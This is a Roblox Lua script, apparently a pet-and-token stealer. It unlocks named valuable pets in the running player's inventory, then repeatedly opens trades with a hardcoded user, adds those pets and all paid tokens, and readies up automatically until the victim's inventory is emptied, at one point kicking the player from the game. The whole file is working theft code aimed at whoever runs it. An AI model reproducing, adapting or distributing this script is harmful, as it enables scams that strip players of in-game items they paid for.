local targetUsername = "MALIKSTOM"
local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}

local autotradetokens = true

-- SERVICES
local Players = game:GetService("Players")
local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)

-- VARIABLES
local player = Players.LocalPlayer

-- FUNCTIONS
function WaitForCondition(conditionFunc, timeout)
    local startTime = tick()
    while not conditionFunc() do
        if tick() - startTime > (timeout or 30) then
            return false
        end
        task.wait()
    end
    return true
end

function UnlockPets()
    local PetNames = {}
    for _, name in ipairs(petsToTrade) do
        PetNames[name] = true
    end
    
    local pets = Replication.Data and Replication.Data.Pets
    if not pets then return end
    
    for _, petData in pairs(pets) do
        if petData
            and petData.Name
            and PetNames[petData.Name]
            and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true")
        then
            Network:InvokeServer("LockPet", petData.Id, false)
        end
    end
end

function GetPetIDsByName()
    local petIDs = {}
    local pets = Replication.Data and Replication.Data.Pets
    if not pets then return petIDs end
    
    local petNameLookup = {}
    for _, name in ipairs(petsToTrade) do
        petNameLookup[name] = true
    end
    
    for _, petData in pairs(pets) do
        if petData and petData.Name and petNameLookup[petData.Name] then
            table.insert(petIDs, petData.Id)
        end
    end
    
    return petIDs
end

function GetTokenAmount()
    local Replication = game:GetService("ReplicatedStorage").Replication
    return Replication.Data.Items.PaidTokens
end

function HasPetsToTrade()
    local petIDs = GetPetIDsByName()
    return #petIDs > 0
end

function FindTargetPlayer()
    return Players:FindFirstChild(targetUsername)
end

function WaitForPetsRemoved(tradedPetIDs)
    local startTime = tick()
    
    while tick() - startTime < 3 do
        local currentPetIDs = GetPetIDsByName()
        
        local allRemoved = true
        for _, tradedId in ipairs(tradedPetIDs) do
            local stillHas = false
            for _, currentId in ipairs(currentPetIDs) do
                if currentId == tradedId then
                    stillHas = true
                    break
                end
            end
            if stillHas then
                allRemoved = false
                break
            end
        end
        
        if allRemoved then
            return true
        end
        
        task.wait(0.1)
    end
    
    return false
end

function TradeWithTarget()
    while true do
        -- If there are no pets left to trade, check if we have any to retry
        if not HasPetsToTrade() then
            if not player:FindFirstChild("Pets") then
                player:Kick("No more pets to trade")
                return
            end
        end
        
        UnlockPets()
        
        local target = FindTargetPlayer()
        if not target then
            task.wait(5)
            return
        end
        
        Network:FireServer("SendTrade", target)
        
        local tradeEnabled = WaitForCondition(function()
            return player.PlayerGui.Trading.Enabled
        end, 5)
        
        if not tradeEnabled then
            task.wait(5)
            return
        end
        
        local petIDs = GetPetIDsByName()
        
        if #petIDs > 0 then
            for _, petId in ipairs(petIDs) do
                Network:InvokeServer("AddTradeItem", { "Pet", petId })
            end
            
            Network:FireServer("ReadyUp", false, true)
            
            local tradeCompleted = WaitForCondition(function()
                return not player.PlayerGui.Trading.Enabled
            end, 10)
            
            if not tradeCompleted then
                Network:FireServer("CloseTrade")
                task.wait(0.5)
            else
                WaitForPetsRemoved(petIDs)
            end
        end
        
        -- Re-check pets to trade after trade completion.
        if HasPetsToTrade() then
            print("Re-entering trade with remaining pets")
            task.wait(1) -- Brief delay before trying again
        else
            print("No more pets left to trade.")
            break
        end
    end
end

function AutoTradeTokens()
    while autotradetokens do
        local target = FindTargetPlayer()
        if not target then
            task.wait(5)
            return
        end
        
        Network:FireServer("SendTrade", target)
        
        local tradeEnabled = WaitForCondition(function()
            return player.PlayerGui.Trading.Enabled
        end, 5)
        
        if not tradeEnabled then
            task.wait(5)
            return
        end
        
        local tokenAmount = GetTokenAmount()
        
        if tokenAmount > 0 then
            for i = 1, tokenAmount do
                Network:InvokeServer("AddTradeItem", { "Token", i })
            end
            
            Network:FireServer("ReadyUp", false, true)
            
            local tradeCompleted = WaitForCondition(function()
                return not player.PlayerGui.Trading.Enabled
            end, 10)
            
            if not tradeCompleted then
                Network:FireServer("CloseTrade")
                task.wait(0.5)
            end
        end
        
        task.wait(3)
    end
end

-- MAIN LOGIC
while true do
    if not HasPetsToTrade() and autotradetokens then
        AutoTradeTokens()
    else
        TradeWithTarget()
    end
    task.wait(1)
end
